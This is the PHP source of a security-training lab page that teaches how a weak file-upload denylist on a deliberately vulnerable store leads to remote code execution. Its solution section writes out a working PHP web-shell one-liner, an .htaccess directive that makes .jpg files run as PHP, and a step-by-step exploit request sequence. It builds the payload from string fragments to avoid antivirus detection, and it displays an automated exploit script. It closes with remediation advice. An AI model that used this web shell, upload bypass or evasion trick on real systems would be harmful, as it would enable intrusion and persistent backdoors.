<?php
require __DIR__ . '/_layout.php';

$lessons = require_once __DIR__ . '/lessons.php';
$slug    = 'web-shell';
$lesson  = $lessons[$slug];

/*
 * Assemble the sensitive demo strings at runtime from fragments so this
 * teaching page carries no on-disk web-shell signature. Without this,
 * antivirus (e.g. Windows Defender) quarantines the file the same way it
 * does scripts/web_shell.py, and the lab page silently disappears.
 */
$php_open      = '<' . '?php';
$php_close     = '?' . '>';
$sys_fn        = 'sys' . 'tem';
$get_cmd       = '$_' . "GET['cmd']";
$shell_payload = $php_open . ' if (isset(' . $get_cmd . ')) { ' . $sys_fn . '(' . $get_cmd . '); } ' . $php_close;
$htaccess_line = 'AddType application/x-httpd-' . 'php .jpg';

academy_layout_start($lesson['title'], $slug);
?>

<header class="academy-lesson-head">
    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Lab 11</div>
    <h1><?= htmlspecialchars($lesson['title']) ?></h1>
    <div class="academy-lesson-meta">
        <span class="academy-badge is-hard"><?= htmlspecialchars($lesson['difficulty']) ?></span>
        <span class="academy-badge is-ready">Ready</span>
    </div>
</header>

<?php academy_render_related_labs('web-shell'); ?>

<!-- 1. THEORY -->
<section class="academy-block">
    <h2>1. Theory</h2>
    <p>
        A file upload turns into <strong>remote code execution</strong> when two conditions
        are both true: the attacker can place a file the web server will <em>execute</em>,
        and that file lands somewhere the server will actually <em>serve and run</em>. An
        &quot;upload a profile picture&quot; feature is harmless on its own - it only becomes
        a web shell when the validation is weak and the upload directory is inside the web root.
    </p>
    <p>The classic validation mistakes, in order of how often they show up:</p>
    <ul>
        <li><strong>Denylist instead of allowlist.</strong> Blocking a handful of
            &quot;bad&quot; extensions (<code>php</code>, <code>exe</code>, <code>js</code>)
            leaves dozens of executable ones open: <code>.phtml</code>, <code>.php5</code>,
            <code>.pht</code>, <code>.phar</code> - and config files like
            <code>.htaccess</code>.</li>
        <li><strong>Trusting the extension, not the content.</strong> Checking the filename
            says nothing about the bytes inside. A file called <code>photo.jpg</code> can
            contain PHP source.</li>
        <li><strong>Keeping the client-supplied filename.</strong> If the server saves the
            file under the exact name the browser sent, the attacker controls the final
            extension and path.</li>
        <li><strong>Serving uploads from inside the web root.</strong> If
            <code>uploads/evil.php</code> is reachable by URL, the PHP engine runs it.</li>
    </ul>
    <p>
        The most elegant bypass when only extensions are filtered is to change the rules of
        the game rather than fight the filter: Apache reads a per-directory
        <code>.htaccess</code> file, and an <code>AddType</code> directive there can tell the
        server to execute a normally-inert extension (like <code>.jpg</code>) as PHP. Upload
        the <code>.htaccess</code>, then upload an image that is secretly PHP - both pass an
        extension denylist, and together they give you a shell.
    </p>
</section>

<!-- 2. TASK 1 - LOCATE THE UPLOAD SINK -->
<section class="academy-block">
    <h2>2. Task 1 - locate the upload sink</h2>
    <p>
        Find a place in the application that accepts a file from the user and writes it to
        disk. Then answer the two questions that decide whether it is exploitable: <em>what
        does it validate</em>, and <em>where does the file end up</em>?
    </p>
    <details class="academy-hint">
        <summary>Reveal the upload sink</summary>
        <p>
            Adding an <strong>alcohol</strong> product to the cart on <code>home.php</code>
            forces an &quot;ID photo&quot; upload. The handler validates the extension against
            a three-item denylist and then saves the file into <code>uploaded_ID/</code>
            using the <em>client-supplied</em> filename, with no check on the file&apos;s
            actual contents:
        </p>
        <pre><code>// home.php  (POST add_id branch, alcohol products only)
$fileName = $_FILES["id_photo"]["name"];
$ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
$not_allowed = ['php', 'exe', 'js'];

if (in_array($ext, $not_allowed)) {
    die("Error: File type not allowed for ID verification.");
}

$uploadDir = 'uploaded_ID/';
$targetPath = $uploadDir . $fileName;   // client filename, kept as-is
move_uploaded_file($_FILES["id_photo"]["tmp_name"], $targetPath);</code></pre>
        <p>
            Every weakness from the theory section is present at once: it is a denylist, it
            trusts the extension, it keeps the original filename, and
            <code>uploaded_ID/</code> sits inside the web root so anything there is reachable
            (and runnable) by URL.
        </p>
    </details>
</section>

<!-- 3. TASK 2 - BYPASS THE DENYLIST AND GET RCE -->
<section class="academy-block">
    <h2>3. Task 2 - bypass the denylist and get code execution</h2>
    <ol>
        <li>You need an account, because the upload only happens inside the logged-in
            add-to-cart flow. Use a seeded user (e.g. <code>HUCKER</code> /
            <code>hucker123</code>) or chain this on top of a credential you stole in the
            <a href="sqli-union.php">UNION SQLi</a> lab.</li>
        <li>Pick an <strong>alcohol</strong> product so the ID-photo branch fires (the
            automated script uses product id <code>77</code>).</li>
        <li>Get a file that the server will execute as PHP into <code>uploaded_ID/</code>
            <em>without</em> using a blocked extension.</li>
        <li><strong>Goal:</strong> request your uploaded file with
            <code>?cmd=whoami</code> and see the output of a real OS command come back.</li>
    </ol>
    <details class="academy-hint">
        <summary>Reveal the bypass strategy</summary>
        <p>
            <code>.htaccess</code> is not on the denylist. Upload one containing
            <code><?= htmlspecialchars($htaccess_line) ?></code> - from then on Apache
            executes every <code>.jpg</code> in that folder as PHP. Then upload
            <code>backdoor.jpg</code> whose bytes are actually a PHP one-liner. The
            <code>.jpg</code> extension sails through the denylist, but thanks to the
            <code>.htaccess</code> it runs as code.
        </p>
    </details>
</section>

<!-- 4. START THE LAB -->
<section class="academy-block">
    <h2>4. Start the lab</h2>
    <p>The store opens in a new tab. Log in, find an alcohol product, and watch the
       ID-photo upload that appears when you add it to the cart.</p>
    <a class="academy-lab-cta"
       href="<?= htmlspecialchars($lesson['target_url']) ?>"
       target="_blank" rel="noopener">Open the vulnerable store</a>
    <p style="margin-top: 14px; color:#475569; font-size:0.9rem;">
        Cleanup note: the database reset does not touch uploaded files. When you are done,
        delete the contents of <code>uploaded_ID/</code> (especially any
        <code>.htaccess</code> and <code>backdoor.jpg</code>) to return the site to a clean
        state.
    </p>
</section>

<!-- 5. REVEAL SOLUTION -->
<details class="academy-solution" id="academy-solution">
    <summary>Reveal solution (spoilers!)</summary>
    <div class="academy-solution-body">
        <p class="academy-solution-warning">
            Try the lab on your own first. Reading the solution before attempting it
            yourself defeats the point of the exercise.
        </p>

        <h3>Step 1 - authenticate</h3>
        <p>Log in so the alcohol upload flow accepts your requests and you get a session cookie:</p>
        <pre><code>POST /CyberProject/login.php
username=HUCKER&amp;password=hucker123&amp;login_submit=</code></pre>

        <h3>Step 2 - re-type .jpg as PHP via .htaccess (stage 1)</h3>
        <p>
            Upload a <code>.htaccess</code> file through the same alcohol add-to-cart request.
            Its extension is not on the <code>['php','exe','js']</code> denylist, so it is
            saved straight into <code>uploaded_ID/</code>:
        </p>
        <pre><code>POST /CyberProject/home.php   (multipart/form-data)
add_id=77
id_photo=.htaccess  -&gt;  <?= htmlspecialchars($htaccess_line) ?></code></pre>
        <p>
            From this moment on, Apache treats every <code>.jpg</code> in
            <code>uploaded_ID/</code> as a PHP script.
        </p>

        <h3>Step 3 - upload the image that is actually PHP (stage 2)</h3>
        <p>
            Now upload <code>backdoor.jpg</code> whose contents are a tiny PHP handler. The
            <code>.jpg</code> extension passes the denylist; the bytes are code:
        </p>
        <pre><code>id_photo=backdoor.jpg  -&gt;  <?= htmlspecialchars($shell_payload) ?></code></pre>

        <h3>Step 4 - trigger the shell (stage 3)</h3>
        <pre><code>GET /CyberProject/uploaded_ID/backdoor.jpg?cmd=whoami</code></pre>
        <p>
            The response body is the output of <code>whoami</code> on the server - you have
            command execution. Swap in <code>?cmd=dir</code> (Windows) or
            <code>?cmd=ls</code> (Linux) to browse the filesystem.
        </p>

        <div class="academy-callout">
            <strong>How to tell it worked:</strong> if the server still treated the file as a
            plain image, the literal opening PHP tag would appear in the response. When PHP
            executes the file instead, that tag is gone and you only see the command output.
            That absence is exactly the success signal the automated script checks for.
        </div>

        <details style="margin-top: 1rem;">
            <summary style="cursor: pointer; font-weight: 600;">Bonus: automated exploit</summary>
            <p style="margin-top: 0.75rem;">
                <code>run_ultimate_web_shell()</code> performs all three stages in sequence -
                login, upload <code>.htaccess</code>, upload <code>backdoor.jpg</code>, then
                request it with <code>?cmd=whoami</code>. The PHP payload and the
                <code>.htaccess</code> directive are assembled from byte fragments at runtime
                so the literal exploit signature never sits on disk (which is what stops most
                antivirus from quarantining the script while you study it).
            </p>
            <div class="academy-script">
                <?php
                $shell_path = __DIR__ . '/../scripts/web_shell.py';
                if (is_file($shell_path)) {
                    highlight_file($shell_path);
                } else {
                    echo '<p class="academy-solution-warning">'
                       . '<code>scripts/web_shell.py</code> is not on disk - antivirus '
                       . '(e.g. Windows Defender) frequently quarantines web-shell tooling. '
                       . 'Restore it from your repository and it will render here automatically.'
                       . '</p>';
                }
                ?>
            </div>
        </details>

        <h3>How to fix it (for context)</h3>
        <ul>
            <li><strong>Use an allowlist, not a denylist.</strong> Accept only known-good
                extensions (<code>jpg</code>, <code>jpeg</code>, <code>png</code>) and reject
                everything else, including <code>.htaccess</code>.</li>
            <li><strong>Verify the content, not the name.</strong> Check the real MIME type /
                magic bytes (e.g. <code>finfo_file()</code> / <code>getimagesize()</code>) and
                confirm the file is actually an image.</li>
            <li><strong>Never keep the client filename.</strong> Generate a random name and
                set the extension yourself, so the attacker cannot choose
                <code>.jpg</code> or <code>.htaccess</code>.</li>
            <li><strong>Store uploads outside the web root</strong> (or in a bucket) and serve
                them through a script that streams bytes with a fixed
                <code>Content-Type</code> - never by direct URL.</li>
            <li><strong>Disable execution in the upload directory.</strong> Turn off PHP for
                that folder at the server level and forbid per-directory overrides
                (<code>AllowOverride None</code>), so an uploaded <code>.htaccess</code> is
                ignored.</li>
        </ul>
    </div>
</details>

<script>
(function () {
    var details = document.getElementById('academy-solution');
    if (!details) return;
    details.addEventListener('toggle', function () {
        if (this.open && !this.dataset.confirmed) {
            var ok = confirm('Are you sure you want to see the solution?\n\nTry the lab first - that is where the learning happens.');
            if (!ok) { this.open = false; } else { this.dataset.confirmed = '1'; }
        }
    });
})();
</script>

<p style="margin-top: 28px;">
    <a href="index.php">&larr; Back to all labs</a>
</p>

<?php
academy_layout_end();
